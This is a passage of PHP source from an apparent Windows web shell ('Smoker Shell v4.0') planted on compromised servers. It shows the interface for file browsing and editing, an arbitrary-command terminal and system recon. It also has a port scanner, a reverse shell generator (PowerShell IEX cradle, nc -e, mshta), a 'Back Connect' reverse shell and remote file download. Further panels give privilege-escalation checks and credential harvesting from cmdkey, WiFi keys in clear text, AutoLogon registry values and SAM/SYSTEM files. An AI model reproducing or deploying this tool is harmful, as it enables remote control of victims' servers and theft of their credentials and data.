    <?php if ($editing): $ef = $_GET['edit']; ?>
        <form method="post">
            <div style="margin-bottom:10px;color:var(--cyan);font-size:11px">Editing: <?= htmlspecialchars($ef) ?></div>
            <input type="hidden" name="edit_path" value="<?= htmlspecialchars($ef) ?>">
            <textarea name="edit_content" style="height:350px;font-size:12px;line-height:1.5"><?= htmlspecialchars(@file_get_contents($ef)) ?></textarea>
            <div style="margin-top:10px;display:flex;gap:8px">
                <button class="btn btn-green" type="submit">Save File</button>
                <a class="btn" href="?p=files&d=<?= urlencode($dir) ?>">Cancel</a>
            </div>
        </form>

    <?php elseif ($hexview): $hf = $_GET['hex']; $hdata = @file_get_contents($hf, false, null, 0, 4096); ?>
        <div style="margin-bottom:10px;color:var(--cyan);font-size:11px">Hex View: <?= htmlspecialchars($hf) ?> (first 4KB)</div>
        <div class="hex-view"><?php
            $len = strlen($hdata);
            for ($i = 0; $i < $len; $i += 16) {
                $hex = ''; $ascii = '';
                for ($j = 0; $j < 16; $j++) {
                    if ($i + $j < $len) {
                        $byte = ord($hdata[$i+$j]);
                        $hex .= sprintf('%02x ', $byte);
                        $ascii .= ($byte >= 32 && $byte <= 126) ? htmlspecialchars($hdata[$i+$j]) : '.';
                    } else { $hex .= '   '; $ascii .= ' '; }
                    if ($j === 7) $hex .= ' ';
                }
                echo '<span class="offset">' . sprintf('%08x', $i) . '</span>  <span class="byte">' . $hex . '</span> <span class="ascii">|' . $ascii . '|</span>' . "\n";
            }
        ?></div>
        <div style="margin-top:10px"><a class="btn" href="?p=files&d=<?= urlencode($dir) ?>">Back</a></div>

    <?php elseif ($viewing): $vf = $_GET['view']; ?>
        <div style="margin-bottom:10px;color:var(--cyan);font-size:11px">Viewing: <?= htmlspecialchars($vf) ?> (<?= fmt_bytes(filesize($vf)) ?>)</div>
        <textarea readonly style="height:350px;font-size:12px;line-height:1.5;color:var(--accent)"><?= htmlspecialchars(@file_get_contents($vf)) ?></textarea>
        <div style="margin-top:10px;display:flex;gap:8px">
            <a class="btn" href="?p=files&d=<?= urlencode($dir) ?>">Back</a>
            <a class="btn" href="?p=files&d=<?= urlencode($dir) ?>&edit=<?= urlencode($vf) ?>">Edit</a>
            <a class="btn" href="?dl=<?= urlencode($vf) ?>">Download</a>
            <a class="btn" href="?p=files&d=<?= urlencode($dir) ?>&hex=<?= urlencode($vf) ?>">Hex View</a>
        </div>

    <?php else: ?>
        <div style="display:flex;gap:16px;margin-bottom:16px;flex-wrap:wrap">
            <form method="post" style="display:flex;gap:6px;align-items:center">
                <input type="text" name="create_name" placeholder="Name" style="width:150px">
                <select name="create_type"><option value="file">File</option><option value="dir">Directory</option></select>
                <button class="btn btn-sm" type="submit">Create</button>
            </form>
            <form method="post" style="display:flex;gap:6px;align-items:center">
                <input type="text" name="rename_from" placeholder="From" style="width:150px">
                <input type="text" name="rename_to" placeholder="To" style="width:150px">
                <button class="btn btn-sm" type="submit">Rename</button>
            </form>
        </div>

        <table class="tbl">
        <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
        <?php
        $parent = dirname($dir);
        if ($parent !== $dir) {
            echo '<tr><td><a href="?p=files&d=' . urlencode($parent) . '">⬆ ..</a></td><td>—</td><td>—</td><td>—</td></tr>';
        }
        $items = @scandir($dir);
        if ($items) {
            $dirs_arr = $files_arr = [];
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $full = $dir . '/' . $item;
                if (is_dir($full)) $dirs_arr[] = $item;
                else $files_arr[] = $item;
            }
            sort($dirs_arr); sort($files_arr);

            foreach ($dirs_arr as $d_item) {
                $full = $dir . '/' . $d_item;
                $mod = @date('Y-m-d H:i', filemtime($full));
                echo '<tr>';
                echo '<td><a href="?p=files&d=' . urlencode($full) . '">📁 ' . htmlspecialchars($d_item) . '/</a></td>';
                echo '<td style="color:var(--text2)">—</td>';
                echo '<td style="color:var(--text2);font-size:11px">' . $mod . '</td>';
                echo '<td><a class="btn btn-sm btn-red" href="?p=files&d=' . urlencode($dir) . '&delete=dir&file=' . urlencode($full) . '" onclick="return confirm(\'Delete directory?\')">Del</a></td>';
                echo '</tr>';
            }

            foreach ($files_arr as $f_item) {
                $full = $dir . '/' . $f_item;
                $size = @filesize($full);
                $mod = @date('Y-m-d H:i', filemtime($full));
                echo '<tr>';
                echo '<td><a href="?p=files&d=' . urlencode($dir) . '&view=' . urlencode($full) . '">📄 ' . htmlspecialchars($f_item) . '</a></td>';
                echo '<td>' . fmt_bytes($size) . '</td>';
                echo '<td style="color:var(--text2);font-size:11px">' . $mod . '</td>';
                echo '<td style="display:flex;gap:4px">';
                echo '<a class="btn btn-sm" href="?p=files&d=' . urlencode($dir) . '&edit=' . urlencode($full) . '">Edit</a>';
                echo '<a class="btn btn-sm" href="?dl=' . urlencode($full) . '">DL</a>';
                echo '<a class="btn btn-sm" href="?p=files&d=' . urlencode($dir) . '&hex=' . urlencode($full) . '">Hex</a>';
                echo '<a class="btn btn-sm btn-red" href="?p=files&d=' . urlencode($dir) . '&delete=file&file=' . urlencode($full) . '" onclick="return confirm(\'Delete?\')">Del</a>';
                echo '</td></tr>';
            }
        } else {
            echo '<tr><td colspan="4" style="text-align:center;color:var(--text2)">Cannot read directory</td></tr>';
        }
        ?>
        </table>
    <?php endif; ?>
    </div>
</div>

<?php
// ============================================================
//  TERMINAL
// ============================================================
elseif ($page === 'terminal'): ?>

<div class="terminal">
    <div class="terminal-head">
        <span class="dot" style="background:var(--red)"></span>
        <span class="dot" style="background:var(--yellow)"></span>
        <span class="dot" style="background:var(--accent)"></span>
        <span style="color:var(--text2);font-size:11px;margin-left:8px"><?= htmlspecialchars($whoami) ?> — <?= htmlspecialchars($dir) ?></span>
    </div>
    <div class="terminal-body" id="termOutput"><?php
        if (isset($_SESSION['cmd_output'])) {
            echo htmlspecialchars($_SESSION['cmd_output']);
            unset($_SESSION['cmd_output']);
        } else {
            echo "Smoker Shell v4.0 [Windows Edition]\nType commands below.\n\nExec methods: " . implode(', ', $sys_info['exec_methods']) . "\n";
        }
    ?></div>
    <form method="post" class="terminal-input">
        <span>C:\&gt; </span>
        <input type="text" name="cmd" autofocus autocomplete="off" placeholder="Enter command..." id="cmdInput">
    </form>
</div>

<?php if (!empty($_SESSION['cmd_history'])): ?>
<div class="panel" style="margin-top:16px">
    <div class="panel-head"><h3>Command History</h3></div>
    <div class="panel-body">
        <?php foreach (array_slice($_SESSION['cmd_history'], 0, 20) as $i => $cmd): ?>
        <div style="padding:4px 0;font-size:11px;color:var(--text2)">
            <span style="color:var(--text2)"><?= $i + 1 ?>.</span>
            <a href="#" onclick="document.getElementById('cmdInput').value='<?= htmlspecialchars(addslashes($cmd)) ?>';return false" style="color:var(--cyan)"><?= htmlspecialchars($cmd) ?></a>
        </div>
        <?php endforeach; ?>
    </div>
</div>
<?php endif; ?>

<?php
// ============================================================
//  SYSTEM RECON
// ============================================================
elseif ($page === 'recon'): ?>

<div class="tabs" id="reconTabs">
    <div class="tab active" data-tab="recon-sys">System</div>
    <div class="tab" data-tab="recon-php">PHP Info</div>
    <div class="tab" data-tab="recon-users">Users</div>
    <div class="tab" data-tab="recon-proc">Processes</div>
    <div class="tab" data-tab="recon-tasks">Scheduled Tasks</div>
    <div class="tab" data-tab="recon-env">Environment</div>
    <div class="tab" data-tab="recon-net">Network</div>
</div>

<div class="tab-content active" id="recon-sys">
    <div class="panel"><div class="panel-head"><h3>System Information</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap;max-height:500px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('systeminfo'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Drives</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('wmic logicaldisk get caption,description,freespace,size,volumename /format:list'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="recon-php">
    <div class="panel"><div class="panel-head"><h3>PHP Configuration</h3></div><div class="panel-body">
        <table class="tbl">
        <tr><td style="color:var(--text2);width:160px">Version</td><td><?= phpversion() ?></td></tr>
        <tr><td style="color:var(--text2)">SAPI</td><td><?= php_sapi_name() ?></td></tr>
        <tr><td style="color:var(--text2)">Disabled Functions</td><td style="word-break:break-all;font-size:10px"><?= htmlspecialchars($sys_info['disabled']) ?></td></tr>
        <tr><td style="color:var(--text2)">Open Basedir</td><td><?= htmlspecialchars($sys_info['open_basedir']) ?></td></tr>
        <tr><td style="color:var(--text2)">Memory Limit</td><td><?= ini_get('memory_limit') ?></td></tr>
        <tr><td style="color:var(--text2)">Upload Max</td><td><?= ini_get('upload_max_filesize') ?></td></tr>
        <tr><td style="color:var(--text2)">POST Max</td><td><?= ini_get('post_max_size') ?></td></tr>
        <tr><td style="color:var(--text2)">Include Path</td><td style="word-break:break-all;font-size:10px"><?= htmlspecialchars(ini_get('include_path')) ?></td></tr>
        <tr><td style="color:var(--text2)">Loaded Extensions</td><td style="font-size:10px"><?php
            $exts = get_loaded_extensions();
            sort($exts);
            foreach ($exts as $ext) echo '<span class="badge badge-cyan" style="margin:1px">' . $ext . '</span> ';
        ?></td></tr>
        </table>
    </div></div>
</div>

<div class="tab-content" id="recon-users">
    <div class="panel"><div class="panel-head"><h3>Current Identity</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('whoami /all'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Local Users</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('net user'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Local Groups</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('net localgroup'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Administrators Group Members</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('net localgroup Administrators'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="recon-proc">
    <div class="panel"><div class="panel-head"><h3>Running Processes</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap;max-height:500px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('tasklist /v'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="recon-tasks">
    <div class="panel"><div class="panel-head"><h3>Scheduled Tasks</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap;max-height:500px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('schtasks /query /fo list /v'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="recon-env">
    <div class="panel"><div class="panel-head"><h3>Environment Variables</h3></div><div class="panel-body">
        <table class="tbl">
        <?php
        $env = $_SERVER + ($_ENV ?? []);
        ksort($env);
        foreach ($env as $k => $v):
            if (is_string($v)):
        ?>
        <tr><td style="color:var(--cyan);width:200px;font-size:10px"><?= htmlspecialchars($k) ?></td><td style="word-break:break-all;font-size:10px"><?= htmlspecialchars(substr($v, 0, 500)) ?></td></tr>
        <?php endif; endforeach; ?>
        </table>
    </div></div>
</div>

<div class="tab-content" id="recon-net">
    <div class="panel"><div class="panel-head"><h3>IP Configuration</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('ipconfig /all'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Listening Ports</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('netstat -ano | findstr LISTENING'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>ARP Table</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('arp -a'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Route Table</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('route print'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Firewall State</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('netsh advfirewall show allprofiles state'))) ?></pre>
    </div></div>
</div>

<?php
// ============================================================
//  NETWORK TOOLS
// ============================================================
elseif ($page === 'network'): ?>

<div class="tabs" id="netTabs">
    <div class="tab active" data-tab="net-scan">Port Scanner</div>
    <div class="tab" data-tab="net-revshell">Reverse Shell Gen</div>
    <div class="tab" data-tab="net-connect">Back Connect</div>
    <div class="tab" data-tab="net-fetch">Fetch URL</div>
    <div class="tab" data-tab="net-dns">DNS Lookup</div>
</div>

<div class="tab-content active" id="net-scan">
    <div class="panel"><div class="panel-head"><h3>TCP Port Scanner</h3></div><div class="panel-body">
        <form method="post">
            <div class="form-row"><label>Host</label><input type="text" name="scan_host" value="<?= htmlspecialchars($_POST['scan_host'] ?? '127.0.0.1') ?>" style="width:200px"></div>
            <div class="form-row"><label>Ports</label><input type="text" name="scan_ports" value="<?= htmlspecialchars($_POST['scan_ports'] ?? '21,22,25,53,80,110,135,139,143,443,445,1433,3306,3389,5432,5985,8080,8443') ?>" style="width:400px"><span style="color:var(--text2);font-size:10px">comma-separated or range (1-1024)</span></div>
            <div class="form-row"><label>Timeout</label><input type="text" name="scan_timeout" value="<?= htmlspecialchars($_POST['scan_timeout'] ?? '1') ?>" style="width:60px"><span style="color:var(--text2);font-size:10px">seconds</span></div>
            <button class="btn btn-green" type="submit">Scan</button>
        </form>
        <?php if (!empty($_SESSION['scan_results'])): ?>
        <table class="tbl" style="margin-top:16px">
            <tr><th>Port</th><th>Status</th><th>Service (common)</th></tr>
            <?php
            $services = [21=>'FTP',22=>'SSH',25=>'SMTP',53=>'DNS',80=>'HTTP',110=>'POP3',135=>'RPC',139=>'NetBIOS',143=>'IMAP',443=>'HTTPS',445=>'SMB',1433=>'MSSQL',3306=>'MySQL',3389=>'RDP',5432=>'PostgreSQL',5985=>'WinRM',8080=>'HTTP-Alt',8443=>'HTTPS-Alt'];
            foreach ($_SESSION['scan_results'] as $port => $status):
            ?>
            <tr>
                <td><?= $port ?></td>
                <td><span class="<?= $status === 'open' ? 'open' : 'closed' ?>"><?= $status ?></span></td>
                <td style="color:var(--text2)"><?= $services[$port] ?? '—' ?></td>
            </tr>
            <?php endforeach; unset($_SESSION['scan_results']); ?>
        </table>
        <?php endif; ?>
    </div></div>
</div>

<div class="tab-content" id="net-revshell">
    <div class="panel"><div class="panel-head"><h3>Reverse Shell Generator</h3></div><div class="panel-body">
        <div class="form-row"><label>LHOST</label><input type="text" id="rs_ip" value="<?= $_SERVER['REMOTE_ADDR'] ?? '10.0.0.1' ?>" style="width:200px"></div>
        <div class="form-row"><label>LPORT</label><input type="text" id="rs_port" value="4444" style="width:100px"></div>
        <div class="form-row"><label>Type</label>
            <select id="rs_type" onchange="generateShell()">
                <option value="powershell">PowerShell (TCP)</option>
                <option value="powershell_b64">PowerShell (Base64)</option>
                <option value="powershell_iex">PowerShell (IEX Cradle)</option>
                <option value="php">PHP</option>
                <option value="python">Python</option>
                <option value="nc">Netcat (nc.exe -e)</option>
                <option value="mshta">mshta</option>
                <option value="bash">Bash (WSL/Git Bash)</option>
                <option value="perl">Perl</option>
                <option value="ruby">Ruby</option>
                <option value="socat">Socat</option>
            </select>
            <button class="btn btn-sm" onclick="generateShell()">Generate</button>
        </div>
        <textarea id="rs_output" readonly style="height:120px;color:var(--accent);margin-top:10px;font-size:12px"></textarea>
        <button class="btn btn-sm" style="margin-top:8px" onclick="navigator.clipboard.writeText(document.getElementById('rs_output').value)">Copy to Clipboard</button>
    </div></div>
</div>

<div class="tab-content" id="net-connect">
    <div class="panel"><div class="panel-head"><h3>Back Connect</h3></div><div class="panel-body">
        <form method="post">
            <div class="form-row"><label>IP</label><input type="text" name="bc_ip" value="<?= $_SERVER['REMOTE_ADDR'] ?? '' ?>" style="width:200px"></div>
            <div class="form-row"><label>Port</label><input type="text" name="bc_port" value="4444" style="width:100px"></div>
            <div class="form-row"><label>Method</label>
                <select name="bc_method">
                    <option value="powershell">PowerShell</option>
                    <option value="php">PHP (fsockopen)</option>
                    <option value="nc">Netcat (nc.exe)</option>
                    <option value="nishang">Nishang IEX</option>
                </select>
            </div>
            <button class="btn btn-red" type="submit" onclick="return confirm('Initiate reverse shell?')">Connect Back</button>
        </form>
    </div></div>
</div>

<div class="tab-content" id="net-fetch">
    <div class="panel"><div class="panel-head"><h3>Fetch Remote File</h3></div><div class="panel-body">
        <form method="post">
            <div class="form-row"><label>URL</label><input type="text" name="fetch_url" placeholder="https://example.com/file.exe" style="width:400px"></div>
            <div class="form-row"><label>Save As</label><input type="text" name="fetch_saveas" placeholder="(auto from URL)" style="width:200px"></div>
            <div class="form-row"><label>Save To</label><span style="color:var(--cyan);font-size:11px"><?= htmlspecialchars($dir) ?>/</span></div>
            <button class="btn btn-green" type="submit">Download</button>
        </form>
    </div></div>
</div>

<div class="tab-content" id="net-dns">
    <div class="panel"><div class="panel-head"><h3>DNS Lookup</h3></div><div class="panel-body">
        <form method="get">
            <input type="hidden" name="p" value="network">
            <div class="form-row"><label>Host</label><input type="text" name="dns" value="<?= htmlspecialchars($_GET['dns'] ?? '') ?>" style="width:300px" placeholder="example.com"></div>
            <button class="btn btn-green" type="submit">Lookup</button>
        </form>
        <?php if (isset($_GET['dns']) && $_GET['dns'] !== ''): $host = $_GET['dns']; ?>
        <div style="margin-top:16px">
            <table class="tbl">
                <tr><td style="color:var(--text2);width:120px">gethostbyname</td><td><?= htmlspecialchars(@gethostbyname($host)) ?></td></tr>
                <?php if (function_exists('dns_get_record')):
                    $records = @dns_get_record($host, DNS_ALL);
                    if ($records): foreach ($records as $rec): ?>
                <tr><td style="color:var(--text2)"><?= $rec['type'] ?></td><td style="font-size:11px"><?= htmlspecialchars(json_encode($rec, JSON_UNESCAPED_SLASHES)) ?></td></tr>
                <?php endforeach; endif; endif; ?>
            </table>
            <div style="margin-top:12px">
                <h4 style="color:var(--accent);font-size:11px;margin-bottom:8px">NSLOOKUP OUTPUT</h4>
                <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('nslookup ' . escapeshellarg($host)))) ?></pre>
            </div>
        </div>
        <?php endif; ?>
    </div></div>
</div>

<?php
// ============================================================
//  DATABASE
// ============================================================
elseif ($page === 'database'): ?>

<div class="tabs" id="dbTabs">
    <div class="tab active" data-tab="db-mysql">MySQL</div>
    <div class="tab" data-tab="db-mssql">MSSQL</div>
    <div class="tab" data-tab="db-sqlite">SQLite</div>
</div>

<div class="tab-content active" id="db-mysql">
    <div class="panel"><div class="panel-head"><h3>MySQL Client</h3>
        <?php if (!function_exists('mysqli_connect')): ?><span class="badge badge-red">mysqli not available</span><?php endif; ?>
    </div><div class="panel-body">
        <form method="post">
            <input type="hidden" name="db_type" value="mysql">
            <div class="form-row"><label>Host</label><input type="text" name="db_host" value="<?= htmlspecialchars($_POST['db_host'] ?? 'localhost') ?>" style="width:200px"></div>
            <div class="form-row"><label>Port</label><input type="text" name="db_port" value="<?= htmlspecialchars($_POST['db_port'] ?? '3306') ?>" style="width:80px"></div>
            <div class="form-row"><label>User</label><input type="text" name="db_user" value="<?= htmlspecialchars($_POST['db_user'] ?? 'root') ?>" style="width:150px"></div>
            <div class="form-row"><label>Password</label><input type="text" name="db_pass" value="" style="width:150px" placeholder="password"></div>
            <div class="form-row"><label>Database</label><input type="text" name="db_name" value="<?= htmlspecialchars($_POST['db_name'] ?? '') ?>" style="width:150px"></div>
            <textarea name="db_query" style="height:80px" placeholder="SHOW DATABASES;"><?= htmlspecialchars($_SESSION['db_query_text'] ?? '') ?></textarea>
            <button class="btn btn-green" type="submit" style="margin-top:10px">Execute</button>
        </form>
    </div></div>
</div>

<div class="tab-content" id="db-mssql">
    <div class="panel"><div class="panel-head"><h3>MSSQL Client</h3>
        <?php if (!function_exists('sqlsrv_connect')): ?><span class="badge badge-red">sqlsrv not available</span><?php endif; ?>
    </div><div class="panel-body">
        <form method="post">
            <input type="hidden" name="db_type" value="mssql">
            <div class="form-row"><label>Host</label><input type="text" name="db_host" value="<?= htmlspecialchars($_POST['db_host'] ?? 'localhost') ?>" style="width:200px"></div>
            <div class="form-row"><label>User</label><input type="text" name="db_user" value="<?= htmlspecialchars($_POST['db_user'] ?? 'sa') ?>" style="width:150px"></div>
            <div class="form-row"><label>Password</label><input type="text" name="db_pass" value="" style="width:150px" placeholder="password"></div>
            <div class="form-row"><label>Database</label><input type="text" name="db_name" value="<?= htmlspecialchars($_POST['db_name'] ?? 'master') ?>" style="width:150px"></div>
            <textarea name="db_query" style="height:80px" placeholder="SELECT name FROM sys.databases;"><?= htmlspecialchars($_SESSION['db_query_text'] ?? '') ?></textarea>
            <button class="btn btn-green" type="submit" style="margin-top:10px">Execute</button>
        </form>
    </div></div>
</div>

<div class="tab-content" id="db-sqlite">
    <div class="panel"><div class="panel-head"><h3>SQLite Client</h3>
        <?php if (!class_exists('SQLite3')): ?><span class="badge badge-red">SQLite3 not available</span><?php endif; ?>
    </div><div class="panel-body">
        <form method="post">
            <input type="hidden" name="db_type" value="sqlite">
            <div class="form-row"><label>DB File</label><input type="text" name="db_file" value="<?= htmlspecialchars($_POST['db_file'] ?? '') ?>" style="width:400px" placeholder="C:\path\to\database.db"></div>
            <textarea name="db_query" style="height:80px" placeholder="SELECT name FROM sqlite_master WHERE type='table';"><?= htmlspecialchars($_SESSION['db_query_text'] ?? '') ?></textarea>
            <button class="btn btn-green" type="submit" style="margin-top:10px">Execute</button>
        </form>
    </div></div>
</div>

<?php if (!empty($_SESSION['db_error'])): ?>
<div class="msg msg-err" style="margin-top:16px"><?= htmlspecialchars($_SESSION['db_error']) ?></div>
<?php unset($_SESSION['db_error']); endif; ?>

<?php if (!empty($_SESSION['db_result'])): ?>
<div class="panel" style="margin-top:16px"><div class="panel-head"><h3>Results (<?= count($_SESSION['db_result']) ?> rows)</h3></div><div class="panel-body" style="overflow-x:auto">
    <?php if ($_SESSION['db_result']): ?>
    <table class="tbl">
        <tr><?php foreach (array_keys($_SESSION['db_result'][0]) as $col): ?><th><?= htmlspecialchars($col) ?></th><?php endforeach; ?></tr>
        <?php foreach ($_SESSION['db_result'] as $row): ?>
        <tr><?php foreach ($row as $val): ?><td style="font-size:11px"><?= htmlspecialchars($val ?? 'NULL') ?></td><?php endforeach; ?></tr>
        <?php endforeach; ?>
    </table>
    <?php else: ?>
    <div style="color:var(--text2)">No results returned.</div>
    <?php endif; ?>
</div></div>
<?php unset($_SESSION['db_result']); unset($_SESSION['db_query_text']); endif; ?>

<?php
// ============================================================
//  PRIVILEGE ESCALATION — WINDOWS
// ============================================================
elseif ($page === 'privesc'): ?>

<div class="tabs" id="privTabs">
    <div class="tab active" data-tab="priv-tokens">Token Privileges</div>
    <div class="tab" data-tab="priv-services">Services</div>
    <div class="tab" data-tab="priv-registry">Registry</div>
    <div class="tab" data-tab="priv-creds">Credentials</div>
    <div class="tab" data-tab="priv-misc">Misc Checks</div>
</div>

<div class="tab-content active" id="priv-tokens">
    <div class="panel"><div class="panel-head"><h3>Token Privileges</h3><span class="badge badge-yellow">Check for exploitable privileges</span></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('whoami /priv'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Key Privileges Explained</h3></div><div class="panel-body">
        <table class="tbl">
        <?php
        $privs_raw = run_cmd('whoami /priv');
        $dangerous = [
            'SeImpersonatePrivilege'    => 'Potato attacks (JuicyPotato, PrintSpoofer, GodPotato, SweetPotato)',
            'SeAssignPrimaryTokenPrivilege' => 'Token impersonation — Potato attacks',
            'SeDebugPrivilege'          => 'Dump LSASS, inject into processes',
            'SeBackupPrivilege'         => 'Read any file (SAM/SYSTEM dump)',
            'SeRestorePrivilege'        => 'Write any file, DLL hijacking',
            'SeTakeOwnershipPrivilege'  => 'Take ownership of any object',
            'SeLoadDriverPrivilege'     => 'Load kernel driver → SYSTEM',
            'SeManageVolumePrivilege'   => 'Arbitrary file write via volume management',
        ];
        foreach ($dangerous as $priv => $desc):
            $found = strpos($privs_raw, $priv) !== false;
            $enabled = $found && strpos($privs_raw, $priv) !== false && preg_match('/' . preg_quote($priv) . '.*Enabled/i', $privs_raw);
        ?>
        <tr>
            <td style="font-size:11px;width:250px"><?= $priv ?></td>
            <td><span class="badge <?= $found ? ($enabled ? 'badge-green' : 'badge-yellow') : 'badge-red' ?>"><?= $found ? ($enabled ? 'ENABLED' : 'DISABLED') : 'Not present' ?></span></td>
            <td style="color:var(--text2);font-size:10px"><?= $desc ?></td>
        </tr>
        <?php endforeach; ?>
        </table>
    </div></div>
</div>

<div class="tab-content" id="priv-services">
    <div class="panel"><div class="panel-head"><h3>Unquoted Service Paths</h3><span class="badge badge-yellow">Hijack via unquoted paths with spaces</span></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.6;white-space:pre-wrap;max-height:400px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Modifiable Services</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.6;white-space:pre-wrap;max-height:400px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('sc query type= service state= all | findstr "SERVICE_NAME DISPLAY_NAME STATE"'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Running Services</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.6;white-space:pre-wrap;max-height:300px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('net start'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="priv-registry">
    <div class="panel"><div class="panel-head"><h3>AlwaysInstallElevated</h3><span class="badge badge-yellow">If both are 1 → install MSI as SYSTEM</span></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?php
        echo "HKLM:\n" . htmlspecialchars(trim(run_cmd('reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1')));
        echo "\n\nHKCU:\n" . htmlspecialchars(trim(run_cmd('reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1')));
        ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>AutoLogon Credentials</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>&1'))) ?>

<?= htmlspecialchars(trim(run_cmd('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>&1'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>UAC Settings</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA 2>&1'))) ?>

<?= htmlspecialchars(trim(run_cmd('reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin 2>&1'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="priv-creds">
    <div class="panel"><div class="panel-head"><h3>Stored Credentials (cmdkey)</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('cmdkey /list'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>WiFi Profiles & Passwords</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.6;white-space:pre-wrap;max-height:400px;overflow-y:auto"><?php
        $profiles = run_cmd('netsh wlan show profiles');
        echo htmlspecialchars($profiles);
        if (preg_match_all('/All User Profile\s*:\s*(.+)/i', $profiles, $m)) {
            echo "\n\n=== Passwords ===\n";
            foreach ($m[1] as $prof) {
                $prof = trim($prof);
                echo "\n--- " . $prof . " ---\n";
                echo htmlspecialchars(trim(run_cmd('netsh wlan show profile "' . $prof . '" key=clear | findstr "Key Content"'))) . "\n";
            }
        }
        ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Sensitive File Access</h3></div><div class="panel-body">
        <table class="tbl">
        <?php
        $sensitive = [
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\Windows\\System32\\config\\SYSTEM',
            'C:\\Windows\\repair\\SAM',
            'C:\\Windows\\repair\\SYSTEM',
            'C:\\inetpub\\wwwroot\\web.config',
            'C:\\Windows\\Panther\\Unattend.xml',
            'C:\\Windows\\Panther\\unattend\\Unattend.xml',
            'C:\\Windows\\System32\\sysprep\\sysprep.xml',
            'C:\\Windows\\System32\\sysprep\\Panther\\unattend.xml',
